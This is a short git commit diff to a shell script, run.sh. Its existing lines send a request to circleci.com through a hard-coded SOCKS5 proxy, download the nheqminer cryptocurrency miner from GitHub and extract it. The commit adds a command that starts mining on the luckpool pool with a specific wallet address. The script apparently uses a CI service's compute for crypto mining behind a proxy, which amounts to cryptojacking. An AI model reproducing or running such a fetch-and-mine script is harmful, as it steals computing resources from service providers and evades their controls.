b55b02f58eb13750cf33d1f65286f34168ac63de
susantosuwandi <93428954+susantosuwandi@users.noreply.github.com>
2021-10-30 18:07:20 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -16,3 +16,5 @@ curl -v -x socks5://207.180.236.140:1080 https://circleci.com/
 wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
 tar -xvf nheqminer-Linux-v0.8.2.tgz 
 tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+#
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.Palpale -p x -t 2
